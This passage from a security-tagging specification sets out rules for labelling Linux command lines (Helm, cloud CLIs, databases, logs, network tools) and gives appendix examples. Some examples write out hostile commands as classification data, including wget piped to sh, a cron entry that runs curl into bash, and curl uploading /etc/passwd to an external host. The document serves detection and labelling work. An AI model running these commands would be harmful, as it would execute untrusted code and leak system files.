path or tool establishes a meaningful source class. Live cluster changes such
as Helm upgrade/install/rollback/uninstall remain workload modification unless
the command is explicitly only a template or dry-run render.
Helm release queries such as history, status, values, and manifest reads inspect
the managed workload or release state; they are not local infrastructure-config
reads solely because Helm values look like configuration. Redirecting that
output to a file does not add a file-path behavior tag.
Helm release test runs are workload/service health tests, not source builds.
Helm template, lint, diff, and comparable render/validation-only operations are
infrastructure-template planning unless they apply changes to a live target.
Jsonnet rendering and Kustomize localization follow the same infrastructure
template planning boundary; output destinations do not add file-path behavior
tags unless the command is explicitly editing local source/config files.
Service-mesh CLI operations follow the same operation split: analysis, injection
rendering, and proxy configuration views are planning or inspection; install
commands apply infrastructure templates; dashboard commands that open a local
web UI are local listener creation.
CI workflow files inside source repositories are source/automation definitions,
not host infrastructure configuration. Reading, linting, diffing, or editing
`.github/workflows` uses source or repository tags. A visible scheduled trigger
inside the workflow, such as an `.on.schedule` query, also reads scheduled-task
content.
Writing a workflow, Dockerfile, Jenkinsfile, or comparable automation file may
use `write_executable_content` when the inserted content is executable syntax,
but embedded future commands do not add current download, upload, credential
read, environment read, or execution tags unless this command line executes
them now.

GitOps and infrastructure-as-code CLIs follow the visible operation, not the
repository, app, stack, or target name. Argo CD and Flux app sync, rollback,
reconcile, suspend, and resume operations modify the managed workload or
deployment state; app diff/get and kustomization listing inspect or enumerate
that state. Terraform, Terragrunt, and Pulumi init, plan/preview, apply/up,
destroy, state, stack-select, and config commands use the corresponding
infrastructure-template or infrastructure-config tags. Explicit secret-config
writes, such as Pulumi `config set --secret`, also use `write_secret_store`.
Git configuration, remote URLs, and repository-local metadata are source
repository state. Reading or changing them uses source repository tags, not
host infrastructure-configuration tags, unless a stronger content class such as
credential material is visibly requested.
Ansible ad-hoc modules and playbooks execute remote automation unless the
visible module is only a connectivity probe. `ping` is
`probe_remote_access_service`; `shell`/`command`/playbook execution is
`execute_remote_command`; `copy`, `package`, and `service` add the visible
file/package/service effect when arguments establish it. Packer `fmt`,
`validate`, `init`, and `build` modify, plan/read, initialize, and build
machine-image templates according to the visible subcommand and builder; VM
image builders use `manage_virtual_machine`, while explicit container builders
use container-image tags. Vagrant, libvirt/virsh, virt-install, virt-clone, and
QEMU lifecycle operations that create, start, stop, suspend, resume, provision,
clone, undefine, or destroy local VM state use `manage_virtual_machine`. VM
status, listing, metadata inspection, console attach, and disk-image file reads
remain ordinary inspect, enumerate, connect, or file-read behavior.
Ansible inventory listing, host views, graph views, and playbook
`--syntax-check` read inventory or automation content but do not execute remote
automation. Dynamic cloud inventory plugins that query provider APIs also
enumerate cloud resources.

Cloud credential wrappers such as `aws-vault exec` are execution-context
boundaries: tag the visible nested command's behavior and add changed-identity
execution only when a command is actually run under that profile. Cloud
kubeconfig export helpers such as `aws eks update-kubeconfig` and `gcloud
container clusters get-credentials` export cluster connection configuration;
when they write local kubeconfig state, `modify_infrastructure_config` may
coexist with `export_cluster_config`.
Cloud CLI login or service-account activation is `authenticate_cloud_cli`; cloud
CLI config setters are `configure_cloud_cli`. Explicit token refresh, renewal,
logout, session revocation, or token-delete APIs use the access-token lifecycle
tags instead of generic cloud CLI configuration.
Cloud account, subscription, project, tenant, and organization listings are
`enumerate_cloud_accounts`. Cloud IAM users, service accounts, roles, service
principals, and groups are cloud identity enumeration or mutation, not cloud
account enumeration.
Cloud IAM policy-document creation, replacement, versioning, or custom-role
definition changes are cloud identity policy modification. Binding a policy or
role to a principal grants cloud privilege; removing that binding revokes cloud
privilege. Visible policy-document file operands read auth-policy content.
Cloud compute reads split by visible scope: bulk `list` or filtered
`describe-instances` resource discovery is `enumerate_cloud_resources`, while a
single VM/server/instance detail view such as `instances describe`, `vm
get-instance-view`, `server show`, or single-instance attribute reads is
`read_cloud_metadata`. Cloud VM remote command helpers are
`execute_cloud_compute`, with the nested script's visible download, execution,
file, service, or inspection behaviors added. Explicit cloud VM restart/reset
operations use `reboot_host`; start, stop, migrate, evacuate, tag, metadata, or
attribute changes remain `modify_cloud_resource`.
Cloud-provider resources and cluster resources are separate. IAM users, roles,
policies, service accounts, cloud functions, cloud SQL instances, snapshots, and
provider-managed templates use cloud-control-plane tags. Kubernetes namespaces,
ConfigMaps, Knative services, cluster add-ons, and dry-run rendered manifests use
cluster/workload or planning tags instead of `create_cloud_resource`. Cloud DB
connection commands are `connect_cloud_database`; auth-token generation,
connection-string display, and SQL execution are token creation, metadata read,
or query behavior according to the visible subcommand.
Cloud DNS, firewall/security-group, IAM privilege, and access-token operations
use their specialized tags instead of generic cloud-resource modification.
Provider queue or stream purge/delete operations modify coordination or queue
state rather than deleting a cloud resource.

PaaS and scheduler CLIs follow visible platform operation. Heroku/Fly app
creation, deploy, scale, config, run, SSH console, secrets, and logs map to
cloud resource modification, workload execution, interactive shell, cloud
secret modification, or workload log reads according to the subcommand. Vault,
Consul KV, ZooKeeper, etcd, and comparable coordination/KV commands use
secret-store or credential tags for secret paths or secret-like keys;
ordinary service/config keys use `read_coordination_data` for reads and
`modify_coordination_data` for writes/deletes. Nomad job run/stop/status and
allocation logs map to workload modification, inspection, and workload log
reads.
Application framework maintenance-mode commands, such as enabling or disabling
maintenance mode, modify service state. A visible maintenance bypass secret or
temporary access token creates access-token material. Explicit render/template
file operands read their source content but do not execute that content unless
the command runs it now.
Vault `operator unseal` changes Vault service availability state and uses
`modify_service_state`. Unseal keys read from visible files or command
substitutions add credential-material reads; output captured with `tee` or
redirection remains incidental output capture.
Remote service, KV, or coordination-state query output redirected to a local
file keeps the source domain tag and does not add a file-path behavior tag.
Mail operations follow visible mail-system semantics. SMTP/IMAP/TLS handshakes
and no-op checks are mail-server connections; synchronization tools such as
fetchmail, getmail, mbsync, offlineimap, and imapsync fetch remote mail. Mailbox
file reads and `doveadm` mailbox queries read mailboxes. Postfix/Exim queue
listing or message inspection inspects the mail queue; queue delete, hold,
release, flush, or retry commands modify it. Spam/ham learning commands train a
mail filter. Commands that visibly send mail use `send_mail`. Mailbox MIME
extraction uses the applicable destination/content semantic tag only when
extracting attachment or message content to local files is the direct operation,
not for incidental reports.
Database CLIs follow the visible database operation. Session opens, readiness
probes, schema enumeration, data queries, schema/data mutations, dumps, restores,
and benchmark/load-test runs use their database-specific tags. SQL file operands
or stdin redirects used by clients such as `psql`, `mysql`, and `mariadb` are
database import or script execution inputs, with semantic source reads added
only when the source path establishes one; when no dedicated script-execution tag
exists, use the visible SQL objective from the subcommand or strong script name,
and keep a plain session tag only when the objective is not established. Client
defaults files are
infrastructure configuration reads. Client TLS certificates and keys are
verification and credential material reads. Database admin status and
process-list commands inspect the service; variables/config views read
infrastructure configuration, and extended status/metrics views read service
metrics.
Database deletion tags distinguish object removal from row/document deletion.
Dropping a concrete database, schema, index, or data stream is `delete_database`;
SQL `DELETE`, `_delete_by_query`, partition/content removal, and wildcard or
bulk deletion of matching data collections are `delete_database_data`.
Database server-side external features are taggable when visible in the SQL.
PostgreSQL `COPY ... TO/FROM PROGRAM` is remote command execution from the
database service context, and server-side file read/write functions inherit the
visible target's semantic file tag when the target path establishes one.
Local database engines such as ClickHouse local mode and DuckDB still use
database query, schema, mutation, import, or export tags according to the SQL
operation. File operands used as table input, query files, init scripts, or
message sources add semantic source reads only when their content class is
visible. SQL text that names `system_config`, `audit_log`, credentials, cron, or
other domains is database data unless the command reads or mutates the external
domain object itself.

Message broker CLIs follow the visible broker operation. Console consumers and
producers use message consume or publish tags without adding connection tags
solely because a broker endpoint is present. Topic creation, deletion, and
partition changes modify broker infrastructure configuration; topic listing and
description inspect that infrastructure. Consumer-group offset resets and group
deletions modify coordination data, while group listing and description inspect
broker coordination state. Queue purge/delete and stream purge operations also
modify broker coordination or queue state, not cache data. Producer or consumer
config files add semantic source reads only when the path establishes a content
class.

Cache CLIs such as Redis clients follow the visible cache or service operation.
Session opens and health probes are distinct from cache data reads. Key scans,
key reads, and cache structure queries use cache query tags; key/value writes,
deletions, pushes, and cache mutations use cache modification tags. Service
metrics and memory/latency/status views read service metrics. Runtime
configuration reads and writes use infrastructure configuration tags, except
credential-bearing configuration such as passwords, which uses credential
material reads when the value is explicitly requested. Snapshot, save, RDB
export, restore, and pipe-import operations use database backup/export/import
tags according to direction. ACL reads and mutations use auth or infrastructure
privilege tags according to the visible operation.
Search/index-service alias, template, route, cluster, and node configuration
views inspect the infrastructure service; mutations to those objects modify
infrastructure configuration.

dbt subcommands are tagged from the dbt operation, not from project or profile
directory names. `deps` installs project dependencies, `seed` loads seed data
into the target database, `run` and `snapshot` modify database data or models,
and `test` runs project tests. Project/profile paths can add semantic source or
configuration reads only when the command visibly reads that content class; path
names alone MUST NOT suppress or invent the dbt subcommand behavior.

Spark, Flink, PySpark, Airflow, Oozie, Azkaban, DolphinScheduler, DataX,
Kettle/Pentaho, dbt, Sqoop, Airbyte syncs, Pinot ingestion, Prefect, Dagster,
Luigi, Argo workflow, Dataflow/Beam, Hadoop/YARN/MapReduce, HBase MapReduce,
and comparable data-processing job systems use `manage_data_processing_job`
for visible job lifecycle and monitoring behavior: submit/run, trigger,
backfill, stop/kill/cancel, clear/rerun, pause/unpause, savepoint/checkpoint
lifecycle, create/delete/update of data-job or sync definitions, status, list,
describe, logs, or monitor operations. REST/API calls to job, flow,
process-instance, task-instance, connection, or sync endpoints follow the same
rule when they create, delete, update, trigger, inspect, or monitor that data
processing unit. Dry-run, validation, and configuration-only forms do not manage
a job unless they also perform one of those lifecycle operations.
`pyspark` without a submitted script opens an interactive Spark shell and should
use the same tag because it creates a data-processing session. Add local
temporary or user-writable execution tags when the submitted application path
establishes them, and add workload execution when the master targets Kubernetes
or an equivalent workload runtime. Spark properties files are infrastructure
configuration inputs with semantic source reads only when the path establishes
another content class. HDFS `dfs` listing, usage, mkdir, get, put, and similar
operations use enumeration, storage inspection, download, upload, permission, or
domain-specific tags according to the visible operation; HDFS path names do not
imply local file content reads. HDFS existence tests such as `-test -e` inspect file
metadata. HDFS permission and ACL subcommands such as `chmod`, `chown`, and
`setfacl` use the generic permission or ACL tags because the visible operation
is an access-control mutation, even though the target is a distributed
filesystem path.
Object-storage metadata queries such as object head/stat and prefix stat/list
operations enumerate object storage. They are not local storage-state
inspection.

Do not infer `manage_data_processing_job` from an incidental product name in an
image, directory, metric label, log path, service daemon start, process path, or
cleanup command. The command must operate on the job/pipeline/workflow itself or
on a specific job-monitoring endpoint.

Local data, ML, and model utility scripts are tagged from their visible inputs
and outputs unless they invoke a job system above. Dataset profiling, feature
building, model evaluation, explanation, export, quantization, redaction, and
report generation read business data when the input dataset/model path
establishes that class. Output reports, metrics, plots, or artifacts do not add
a generic file-write tag; add an output-side tag only when the destination or
artifact has a retained security semantic such as temporary or hidden staging,
executable content, archive/compression, credential material, or source/config
mutation. Feature-store pushes and comparable sync scripts use transfer or
synchronization tags for the visible endpoint. Validation-only scripts read the
validated data/config or verify the named artifact; they are not job management
solely because the script is part of a pipeline.

SQL gateway clients such as Beeline tag the visible data-service session or SQL
operation. Query files and init files are database inputs with semantic source
reads added only when the source path establishes a content class. Trust stores,
keytabs, and similar connection-material operands are verification or credential
material reads when visible in the connection string or options.

Shell wrappers such as `sh script`, `bash script`, and explicit `-c` forms expose
the nested command or script execution that runs now, but they are not retained
behavior tags by themselves. Tag only the nested command's visible behavior,
such as service mutation, content read/write, network connection, or execution
from a temporary/user-writable path. Privileged shell modes do not by themselves
imply privilege escalation. Startup and rcfile operands for interactive shells
are shell initialization inputs; they do not prove future payload execution
beyond the shell startup behavior visible in the command.
Current-session aliases or environment changes such as `alias x=...`,
`export HISTFILE=...`, or `unset HISTFILE` are not shell-startup modification
unless persisted to a startup file. Shell history clearing requires a visible
history clear, deletion, truncation, overwrite, or targeted edit of a history
file; changing future history variables alone is not clearing existing history.

OCI artifact tools follow artifact operation semantics. Cosign verify,
triangulate, and attestation verification inspect or verify artifact metadata;
oras/crane login authenticate; pull/download, push/upload, copy/tag, manifest,
config, digest, and delete map to download/upload/transfer, inspect, or delete
container-image/artifact behavior according to the subcommand. Helmfile `diff`
is infrastructure planning, `sync`/`apply` modify workloads or apply templates,
and `destroy` destroys managed infrastructure/workloads.
Docker, Podman, Buildah, Kaniko, BuildKit, and Compose image-build operations
use `build_container_image`, not `build_source_code`; Compose `up --build`
keeps the visible container creation/start behavior as well.
Cluster build triggers such as OpenShift `start-build` use container-image build
semantics; follow/log modes add workload log reads.
Application-store or depot upload commands that log in and submit a build use
remote authentication plus the visible upload direction, not source-build tags,
unless the same command also performs a local build step.

Dynamic loader behavior is split by persistence target. `ldconfig` and loader
cache or search-path updates modify dynamic-loader state. Writes, edits,
symlinks, or truncation involving `/etc/ld.so.preload` modify library preload
state. One-shot `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, GCONV, or explicit
loader-invocation execution uses dynamic-loader execution behavior.

Cryptographic commands tag the visible cryptographic operation plus retained
semantic reads and writes. Key generation creates credential material;
certificate/CSR inspection or signing reads verification or credential inputs
and writes verification material when an output path is visible.
Encryption/decryption reads the semantic source object and uses
`encrypt_data`/`decrypt_data`; the destination path adds another tag only when it
has a retained security semantic such as credential material, verification
material, temporary or hidden staging, archive/compression, source/config
mutation, or executable content. Digest and signature verification read the
target artifact but do not become credential creation merely because key
material is used.
Access-token creation is for bearer/session/SAS/presigned/Kerberos or comparable
time-bound access artifacts. Long-lived private keys, keystores, keytabs,
password hashes, robot credentials, and certificate private-key bundles are
credential material. Credential cracking tools use `crack_credential_material`;
benchmark or self-test modes are performance tests, not cracking attempts.
Encoding tags are for representation transforms such as base64, hex, JWT decode,
and comparable reversible encodings. Plain text filtering or character deletion
with tools such as `tr` and `sed` is not encoding unless the command performs a
recognized encoding transform.
Signature, attestation, and certificate tools that take explicit key,
predicate, certificate, keystore, or artifact operands MUST tag those operands'
visible semantic reads when the path establishes the content class. Key or
keystore import, export, delete, and generation commands tag the visible
credential or verification material mutation direction. Certbot standalone and
webroot certificate issuance fetch remote certificate material; Certbot webserver
installer plugins such as `--nginx` and `--apache` also modify infrastructure
configuration.

Network control tools MUST follow their primary operation. Active wireless
scans are endpoint probes; viewing cached scan results or link/status state is
network-state inspection. WPA supplicant network-list or configured-network
field queries also inspect network state; they are not host infrastructure
configuration reads. `ipset` and connection-tracking mutations are firewall
policy/state mutations; listing them is inspection. SSH host-key collection with
`ssh-keyscan` is a remote-access service probe, not a generic certificate fetch.
VPN tools such as OpenVPN and WireGuard MUST use VPN management for connection
or peer configuration actions, and network-state inspection for status views.

Binary dependency and loader inspection tools such as `ldd` inspect the target
file's linked dependencies or metadata. They are `inspect_file_metadata`, not
generic system-state inspection, unless the command visibly queries runtime
system state.
Content rendering tools such as `strings`, `hexdump`, and `xxd` read target
content. They inherit the target's semantic read tag and MUST NOT add
`inspect_file_metadata` unless the command visibly inspects metadata rather than
content.
Kernel and runtime tracing tools such as `bpftrace`, `execsnoop`, `opensnoop`,
`filetop`, `fileslower`, `filelife`, `perf trace`, and `sysdig` tag the tracing,
eBPF loading, packet capture, or capture-file read that is currently performed.
Probe names, filters, process names, and quoted command patterns are selectors
only; they MUST NOT be tagged as execution, semantic file reads, credential
reads, or log reads unless the command actually executes or reads that object
now. Process-exec tracers use `trace_process_execution`; file-open/access
tracers use `trace_file_access`. Output flags that write trace or capture data
tag the visible write only when the vocabulary has a suitable write tag.
`strace` and `ltrace` follow the same rule; a real command operand is executed
under tracing, while `strace -e trace=file`, `open`, or `openat` forms are file
access tracing rather than semantic reads of the matched paths.
Kernel parameter reads and writes include `sysctl` and `/proc/sys` paths.
Kernel state reads include `dmesg`, `uname`, cgroup/kernel debug state, and
feature/status probes that do not read a tunable parameter. Process memory reads
cover `/proc/<pid>/mem`, core files, heap dumps, and memory images; thread dumps,
backtraces, stack dumps, pprof/perf captures, and comparable runtime snapshots
capture process state. Terminal scrollback capture from tools such as tmux is
not process-state capture. Commands that add or remove tracing probes modify
kernel tracing state; commands that record or display observed execution traces
use tracing tags.
Local hardware and accelerator status tools such as GPU inventory, utilization,
topology, clock, power, and temperature queries inspect system state. Cluster
metric commands such as Kubernetes `top` read service metrics rather than local
host state.
Host security audit and malware scan tools inspect system state unless a more
specific content class is visible. Their target path alone does not make the
operation storage-state inspection. Explicit report, log, quarantine, or output
destinations do not add file-path behavior tags; quarantine or move operations
require a retained semantic tag such as critical-path, credential, log, archive,
or domain-specific mutation to be taggable.
Packet tools such as `tcpdump` and `tshark` use live capture tags for interface
captures and `read_packet_capture` for `-r` capture-file reads. Capture filters
and display filters are selectors; uploading captured output keeps both the
capture/read tag and the visible upload direction. Tools that read saved pcap,
pcapng, flow, or Zeek input files use `read_packet_capture`; tools that merely
serve or relay a capture-named file over a listener do not become packet
capture. Active traffic redirection or spoofing commands are route modification
when the visible objective is path manipulation; add listener tags only when the
tool starts reachable services now.
Shell and tunnel direction is determined by the command's active network role.
`spawn_bind_shell` requires a listening endpoint whose executed program is a
shell; a listener that serves a file, forwards bytes, or runs a non-shell command
is not a bind shell. `spawn_reverse_shell` requires an outbound connection wired
to an interactive shell; strings that merely print a payload, dead arguments, or
one-way content piped into an interpreter are not reverse shells. Reverse-tunnel
clients such as `ssh -R` and `autossh -R` are not additionally local listeners,
but reverse-tunnel servers or relay daemons with explicit listen ports do listen.
Loopback and Unix-socket services are local listeners; wildcard or non-loopback
binds are network listeners. Remote interactive clients such as Mosh, Telnet, and
WinRM open remote sessions; tag them as service connections and add
`spawn_interactive_shell` only when the command establishes an interactive shell
or shell-like session, not for banner probes.
DNS record, zone, resolver, and provider-record mutations are DNS config
modification. DNS cache flushes are cache flushes, not DNS config changes.
DNS server zone/config reload commands are DNS configuration state changes, not
generic service-state changes, when the visible operation is reloading DNS
zones or resolver configuration.
Zone-transfer commands use `perform_dns_zone_transfer`; uploaded zone-transfer
output keeps the visible upload direction and sensitive-content class when the
zone or output path establishes it. VPN start, stop, up, down, and initiate
commands manage VPN connections; explicit VPN profile/config operands also read
infrastructure config.
System log writers such as `logger` tag appended system-log content. Literal log
messages are not executed or reclassified from their text. File-input modes such
as `logger -f` and journald-entry file modes also read the visible source file's
semantic content when the source path establishes one.
Journal readers such as `journalctl` tag the visible journal read, search,
storage inspection, or vacuum operation. Unit names, fields, and time ranges are
filters; they MUST NOT become service inspection or execution tags. SSH/auth
units and fields read authentication audit logs, audit transports or auditd read
system audit logs, infrastructure daemons read infrastructure logs, and
application/business services read business logs. `--vacuum-*` mutates journal
retention and is log deletion; `--disk-usage` inspects journal storage usage.
Deleting visible log files is log deletion, not a file-path deletion behavior.
Authentication and audit logs use `delete_audit_log`, system logs use
`delete_system_log`, infrastructure daemon logs use `delete_infrastructure_log`,
and application or business-service logs use `delete_business_log`. If the same
command also deletes non-log artifacts, add another tag only when those artifacts
have a retained semantic class.
Log rotation tools read their visible rotation configuration. Debug or dry-run
forms tag only the configuration read and other non-mutating inspection visible
in the command. Forced, verbose, or normal rotation forms that actually perform
rotation tag compression/rotation behavior in addition to the configuration
read.

Storage inventory and usage tools such as `df`, `du`, `lsblk`, `blkid`, and
partition-table listing forms of `fdisk`/`sfdisk` are storage-state inspection.
Their path operands MUST NOT be upgraded to semantic file, secret, SSH, or
cluster reads unless the tool visibly reads that content rather than storage
metadata or usage.

Partition editors without an explicit listing, size, dump, JSON, print, or dry
run mode are storage-volume mutation. `partprobe` without dry-run mutates the
kernel's partition view; dry-run forms are storage-state inspection.

Filesystem check tools are storage-state inspection when run in dry-run,
no-write, or report-only modes. Auto-repair modes such as assume-yes or
preen/automatic repair are storage-volume mutation. Mount table queries are
storage-state inspection; mounting and unmounting are mount-state mutation.
Loop-device attach/detach mutates storage-volume state; loop-device listing or
free-device discovery is storage-state inspection. Swap creation/enabling and
disabling are swap-state mutations, not ordinary filesystem formatting. Block
copy tools such as `dd` are copies or reads according to their visible source
and destination; writing to `/dev/null` or `/dev/zero` is not secure deletion
unless the command visibly overwrites the target object being deleted.
Container or local volume lifecycle operations such as volume removal mutate
storage-volume state rather than deleting ordinary filesystem paths.
Snapshot listing, snapshot metadata display, and backup snapshot inventory are
inspection. Snapshot creation, deletion, rollback, merge, protect, unprotect,
or restore/import operations use snapshot management.

Single-stream compression tools such as `gzip`, `gunzip`, `bzip2`, and `xz` use
compression or decode tags. Their decompression modes MUST NOT be labeled as
archive extraction unless the tool actually extracts archive members. Test modes
that validate compressed streams are artifact-integrity verification.
Compression, archive, decode, and integrity-test commands also inherit visible
source-content read tags when the source path identifies scheduled-task,
credential, log, config, business, source-code, process-memory, or comparable
semantic content.
Archive listing modes such as `tar -tf`, `zip/unzip -l`, `7z l`, and `cpio -it`
enumerate archive members. Package manager metadata queries against the local
package database or configured package repositories, including OS package
managers and language package managers such as `apt`, `apt-cache`, `yum`, `dnf`,
`zypper`, `apk`, `pacman`, `pip`, `gem`, `composer`, `cargo`, `npm`, `yarn`,
`pnpm`, and `rpm -q*` query forms, are package enumeration.
Remote application-store searches such as `snap find` and `flatpak search` are
package enumeration, not a removed remote-query fallback. Package-manager
commands that request ephemeral package resolution for a visible command, such
as `npx --package`, include
`install_package` in addition to the invoked command's visible behavior. Package
simulation requires an explicit dry-run/simulate/no-act form; debug output alone
does not make an update or install simulated. `execute_package_hook` is reserved
for commands that visibly run package maintainer scripts, package triggers, or
package lifecycle scripts, such as explicit configure/trigger/postinst invocations
or install commands that explicitly enable script execution. Plain package
installs do not gain that tag solely because package managers may run hooks
internally. Persisting hook content into a package artifact is future behavior,
not current hook execution. System selector tools such as `alternatives --install`
are system configuration mutations, not package installs or hooks. Package
scripts and build targets such as `npm run`, `yarn run`, `pnpm run`, and
`make <target>` MUST NOT be tagged from target names alone. Tag only visible
effects in the command line, or standard build/test/lint behavior when the tool
form itself establishes it. Standalone project test commands such as `go test`,
`cargo test`, `pytest`, `npm test`, `npm run test`, `yarn test`, `pnpm test`,
`gradle test`, and Unity test runs use `build_source_code` as project source
build/validation behavior when the tool form establishes a real test run. Report
and coverage output paths are incidental unless the command directly edits
source/config/data files. Lint, type-check, static-analysis, and documentation-generation
commands follow the same rule; benchmark commands use `run_performance_test`.
Source-code generators and formatters that write generated or reformatted source
use `modify_source_code`; artifact-only compilers may still use
`build_source_code`.
Compiler, linter, and syntax-check commands that take a strongly identified
non-source input such as an audit log, systemd unit, Kubernetes manifest, or
build script inherit that input's semantic read tag instead of being reduced to
source-build behavior.
Standard install targets such as `make install` use `install_package`; dry-run
publish/package verification uses `verify_artifact_integrity`. Strong persistence
targets such as an executed `install-persistence` target may use persistence tags
when the objective is explicit.
Dry-run or no-op build forms such as `make -n` do not use `build_source_code`
unless another visible tag captures the simulated operation.
Build or package commands that explicitly pass a hook payload for current
execution, such as a pre-goal or release-hook command, use
`execute_package_hook` plus the visible nested behavior.
Storage pool scrub/status/list operations are
storage-state inspection unless the command visibly creates, imports, destroys,
or reconfigures storage state.

Command wrappers that accept a command operand, including `ssh-agent <command>`,
execute that operand now. Reviewers MUST tag the nested command's visible
behavior when a specific execution tag applies; wrapper setup without a command
operand has no behavior tag by itself.

## Schema Boundary Notes

This section is normative, but intentionally limited. The RFC does not repeat
obvious tag names from the schema. It records only schema-level boundaries that
are easy to overuse, confuse with siblings, or break after recent tag removals.

- Generic file CRUD tags do not exist in rev20. Ordinary create/write/delete/
  copy/move mechanics get no tag unless the target has a retained security
  meaning: credential, log, source, scheduled task, systemd unit, critical
  system path, temporary or hidden staging, special node, executable content,
  trust store, kernel module, archive/compression, transfer direction, or a
  domain-specific mutation.
- Generic search does not exist in rev20. Only credential/sensitive/SUID/SGID/
  capability/world-writable search classes have retained search labels. Other
  filename discovery is `enumerate_filesystem`; content filtering inherits the
  visible source class, such as config, source, business data, or log.
- Generic remote-service query does not exist in rev20. HTTP/RPC/API requests
  must use a concrete probe, health, metrics, download/upload, mail, database,
  cache, object-storage, cloud, workload, infrastructure, or other retained
  domain tag. Opaque remote/API reads with no retained security target get no
  placeholder tag.
- `inspect_system_state`, `inspect_service`, `inspect_infrastructure_service`,
  `inspect_workload`, and generic cloud resource CRUD are strict fallbacks. Use
  them only after more specific read, metric, log, config, auth, secret,
  workload, storage, network, kernel, package, cloud, or domain tags are
  excluded.
- `read_container_secret` is for secret material exposed through a container
  runtime, mounted secret path, or container environment. `read_cluster_secret`
  is for secret objects read through the cluster API.
- Cluster privilege revocation has no dedicated rev20 tag. Use
  `modify_cluster_auth_policy` for visible removal or weakening of cluster
  RBAC/auth policy unless the operation is a concrete secret or identity-object
  deletion.
- Lifecycle tags such as `manage_data_processing_job`, `manage_virtual_machine`,
  `manage_snapshot`, `manage_database_backup`, and
  `manage_infrastructure_backup` are valid security-domain labels. Do not split
  them by verb unless a future downstream security decision requires finer
  direction.

## Corpus Row Shape

Corpus rows and manual review overlay rows MUST use top-level fields for active
metadata. They MUST NOT use nested explanation wrappers or model-output
bookkeeping as row fields.

Required fields for a full corpus row:

```json
{
  "observation_id": "stable row id",
  "raw": "one raw Linux command line",
  "behavior_tags": ["zero or more visible complete behavior labels"],
  "label_source": "source identifier",
  "meaning": "one objective sentence or paragraph about the visible command",
  "review_count": 0
}
```

`meaning` is the only explanation field. Rows MUST NOT contain `rationale`,
`review_rationale`, `stage1_analysis`, `objective_analysis`, or corpus-row
`model`.

`review_count` is a non-negative integer. New rows start at `0`. Each completed
manual or agent review pass over that row MUST increment it by exactly `1`,
regardless of whether the tags changed.

## Corpus Change Gate

Every corpus tag change MUST include:

1. The visible command evidence.
2. The previous tag set and proposed tag set.
3. At least one RFC principle ID.
4. A short explanation of why the previous tag set violates that principle.

Appendix example IDs MAY be cited as supporting evidence, but an example alone is
not sufficient authority for a corpus rewrite.

The following are not sufficient reasons to change a row:

- "More precise."
- "Looks suspicious."
- "A path name appears without a visible operation that uses it."
- "The binary often does X."
- "Another reviewer would tag it this way."
- "The command could do X after execution."
- "The model currently confuses this label."

If no existing principle decides the case, reviewers MUST update the RFC core or
add the case to the open gaps before changing matching corpus rows.

## Review Workflow

### New corpus row

1. Apply the decision procedure.
2. Apply the tagging principles.
3. Consult appendix examples only as illustrations of the principles.
4. If no principle covers a high-confusion case, propose an RFC update before
   adding many similar rows.

### Existing corpus row

1. Start from "no change".
2. Identify a concrete schema or RFC principle violation.
3. Change only the tags needed to fix the violation.
4. Preserve the row when both tag sets are defensible under current principles.

### RFC update proposal

A proposal SHOULD include:

```json
{
  "principle": "RFC-PN or new principle",
  "status": "proposed",
  "problem": "short description of recurring ambiguity",
  "normative_change": "exact MUST/SHOULD language if the core changes",
  "positive_examples": [
    {"cmdline": "...", "behavior_tags": ["..."]}
  ],
  "negative_examples": [
    {"cmdline": "...", "behavior_tags": ["..."], "forbidden_tags": ["..."]}
  ],
  "migration_scope": "which corpus rows or tools are affected"
}
```

Do not bulk-edit corpus rows for a proposed RFC change until the change is
accepted into the RFC core.

## Open RFC Gaps

These areas need stronger RFC decisions before aggressive review:

- Residual `inspect_*` vs `read_*` cases where the tool can either inspect
  metadata or render semantic content and no domain paragraph decides it.
- `read_credential_material` vs `read_secret_store` where a secret-like value is
  addressed through a generic KV/config store path.
- Database client `open_data_service_session` vs query/modify/dump/import when
  the command opens a session and carries only initialization or ambiguous SQL
  operands.
- Pipeline right-hand side behavior when the left stage only produces metadata.
- Shell wrappers and copied binaries where the operative tool is hidden.
- Localhost/internal/external classification for URLs and sockets when the
  literal endpoint is absent or supplied through variables.

These gaps are narrow exceptions. Reviewers SHOULD still apply the accepted
principles above to rows that plainly match them.

## Appendix A: Boundary Examples

Appendix examples are non-normative. They document recurring applications of the
RFC principles and give reviewers stable example IDs for discussion. They do not
add new tag semantics.

### EX-EVIDENCE-PATH: Operation Beats Path

Principles: RFC-P1, RFC-P5

```text
cat /home/user/.my.cnf
-> read_infrastructure_config

grep -R password /srv
-> search_credentials

cat /var/log/auth.log
-> read_auth_audit_log

mysqldump --defaults-file=/home/user/.my.cnf db > out.sql
-> export_database_dump
not read_credential_material

pyspark --properties-file /var/log/syslog
-> manage_data_processing_job
not read_system_log
```

### EX-CURRENT-EXECUTION: Quoted Text Is Not Current Execution

Principles: RFC-P2, RFC-P8

```text
wget http://203.0.113.10/a.sh | sh
-> download_script, execute_downloaded_content

grep -R 'ssh -L 15432:db:5432' /etc
-> read_system_config
not create_forward_tunnel

echo '*/5 * * * * root curl http://x/a|bash' > /etc/cron.d/cache
-> create_scheduled_task
not execute_downloaded_content
```

### EX-COMPOSITION: Independent Stage Evidence

Principles: RFC-P3, RFC-P4

```text
ssh app01 'grep -R password /srv'
-> execute_remote_command, search_credentials

tar -tf bundle.tgz | head
-> enumerate_filesystem
not extract_archive

ssh -R 2222:127.0.0.1:22 relay
-> create_reverse_tunnel
not listen_network_port
```

### EX-SEARCH: Included Search Objective

Principles: RFC-P5

```text
grep -R 'password' /srv
-> search_credentials

find / -name '*.env'
-> search_sensitive_files

find /etc -name '*.conf'
-> enumerate_filesystem
not search_sensitive_files

grep Listen /etc/ssh/sshd_config
-> read_ssh_policy
not search_sensitive_files

grep 'Failed password' /var/log/auth.log
-> read_auth_audit_log
not search_credentials

journalctl -u sshd --grep '/home/ops/.ssh/authorized_keys'
-> read_auth_audit_log
not search_credentials

sshd -T | grep PasswordAuthentication
-> read_ssh_policy
not search_credentials

grep -v 'password' app.log
-> read_business_log
not search_credentials
```

### EX-IDENTITY: Directory Boundary And Policy Companions

Principles: RFC-P5, RFC-P7

```text
getent passwd deploy
-> read_identity_data

ldapsearch -x -H ldap://ldap.internal -b 'ou=groups,dc=corp,dc=internal' '(cn=ops-oncall)' member
-> connect_internal_service, read_identity_data

ldapwhoami -x -H ldap://ldap.internal
-> connect_internal_service, inspect_current_identity

getent group sudo
-> read_identity_data, read_sudo_policy

curl --data-binary @/etc/passwd https://ext/upload
-> read_identity_data, upload_external_content, upload_sensitive_content
```

